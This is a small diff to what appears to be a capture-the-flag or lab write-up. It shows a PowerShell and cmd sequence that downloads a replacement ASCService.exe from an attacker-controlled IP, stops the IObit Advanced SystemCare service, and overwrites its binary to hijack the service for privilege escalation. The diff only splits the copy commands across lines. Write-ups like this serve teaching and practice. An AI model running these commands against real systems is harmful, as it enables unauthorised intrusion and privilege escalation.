@@ -53,8 +53,10 @@ Putting this all together, we can replicate yesterday's compromise by:
 ```powershell
 powershell -c "Invoke-WebRequest -Uri http://10.13.26.40/ASCService.exe -OutFile ASCService.exe"
 sc stop AdvancedSystemCareService9
-copy "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe" ASCService.exe.bak
-copy /Y ASCService.exe "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
+copy "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
+	ASCService.exe.bak
+copy /Y ASCService.exe
+	"C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
 sc start AdvancedSystemCareService9
 ```
 
